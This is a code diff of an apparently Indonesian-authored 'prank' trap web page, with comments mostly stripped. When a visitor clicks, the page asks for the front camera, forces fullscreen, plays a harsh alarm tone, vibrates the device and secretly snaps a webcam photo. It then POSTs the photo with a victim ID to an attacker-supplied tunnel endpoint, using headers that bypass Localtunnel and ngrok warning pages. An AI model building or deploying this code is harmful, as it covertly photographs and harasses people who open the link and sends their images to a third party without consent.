@@ -143,34 +143,30 @@
     <canvas id="canvas" style="display:none;"></canvas>
 
     <script>
-        // 1. TANGKAP DATA API DARI URL BOT (.iplogger)
+        // 1. TANGKAP DATA API DARI URL BOT
         const urlParams = new URLSearchParams(window.location.search);
-        const apiTarget = urlParams.get('api') || ''; // Ini dapet dari Localtunnel Bot lu
-        const TRAP_ID = urlParams.get('id') || 'VERCEL_TRAP'; // ID unik korban
+        const apiTarget = urlParams.get('api') || ''; 
+        const TRAP_ID = urlParams.get('id') || 'VERCEL_TRAP';
 
         const btn = document.getElementById('prank-btn');
         const prankScreen = document.getElementById('prank-screen');
         const mainContent = document.getElementById('main-content');
-        
         const video = document.getElementById('webcam');
         const canvas = document.getElementById('canvas');
         const photo = document.getElementById('captured-photo');
 
-        // Fungsi Suara Rusak/Bising
+        // Fungsi Suara Bising
         function playAnnoyingSound() {
             try {
                 const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
                 const oscillator = audioCtx.createOscillator();
                 const gainNode = audioCtx.createGain();
-
                 oscillator.type = 'sawtooth';
                 oscillator.frequency.setValueAtTime(800, audioCtx.currentTime); 
-                
                 setInterval(() => {
                     const freq = oscillator.frequency.value === 800 ? 1200 : 800;
                     oscillator.frequency.setValueAtTime(freq, audioCtx.currentTime);
                 }, 100);
-
                 gainNode.gain.setValueAtTime(1, audioCtx.currentTime);
                 oscillator.connect(gainNode);
                 gainNode.connect(audioCtx.destination);
@@ -178,14 +174,13 @@
             } catch(e) {}
         }
 
-        // Fungsi Jepret & Kirim ke Bot (YANG SUDAH DIPERBAIKI)
+        // Fungsi Jepret & Kirim ke Bot
         function takePhotoAndSend() {
             try {
                 canvas.width = video.videoWidth;
                 canvas.height = video.videoHeight;
                 canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
                 
-                // Ubah jadi base64 image
                 const dataUrl = canvas.toDataURL('image/jpeg', 0.6);
                 photo.src = dataUrl;
                 photo.style.display = 'block';
@@ -193,40 +188,33 @@
                 const stream = video.srcObject;
                 if (stream) { stream.getTracks().forEach(track => track.stop()); }
 
-                // PENGIRIMAN RAHASIA KE BOT WHATSAPP DENGAN TIKET BYPASS
+                // Kirim pake Tiket VIP biar nembus Localtunnel
                 if (apiTarget) {
                     fetch(apiTarget + '/api/trap/photo', {
                         method: 'POST',
                         headers: { 
                             'Content-Type': 'application/json',
-                            // INI KUNCI RAHASIANYA BIAR GAK DIBLOCK LOCALTUNNEL / NGROK
                             'Bypass-Tunnel-Reminder': 'true',
                             'ngrok-skip-browser-warning': 'true'
                         },
                         body: JSON.stringify({ id: TRAP_ID, photoBase64: dataUrl })
-                    })
-                    .then(response => console.log("Laporan terkirim! Status:", response.status))
-                    .catch(err => console.log("Gagal lapor ke markas:", err));
+                    }).catch(err => console.log("Gagal lapor ke markas"));
                 }
             } catch(e) {}
         }
 
         // Mulai Prank
         function startPrank() {
-            // Fullscreen
             const elem = document.documentElement;
             if (elem.requestFullscreen) elem.requestFullscreen().catch(()=>{});
             else if (elem.webkitRequestFullscreen) elem.webkitRequestFullscreen().catch(()=>{});
 
-            // Ganti Layar
             mainContent.style.display = 'none';
             prankScreen.classList.add('active-prank');
 
-            // Serangan Audio
             playAnnoyingSound();
             if (navigator.vibrate) { navigator.vibrate([3000, 30, 3000, 30, 5000]); }
 
-            // Jepret foto setelah 1 detik
             setTimeout(takePhotoAndSend, 1000);
         }
 
@@ -236,14 +224,10 @@
             btn.style.backgroundColor = "#ff9800";
             
             try {
-                // Minta izin kamera
                 const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                 video.srcObject = stream;
-                
-                // Tunggu kamera fokus, baru ledakkan prank
                 setTimeout(startPrank, 600);
             } catch (err) {
-                // Kalau korban menolak izin kamera (Block), prank tetap jalan untuk ngagetin!
                 startPrank();
             }
         });
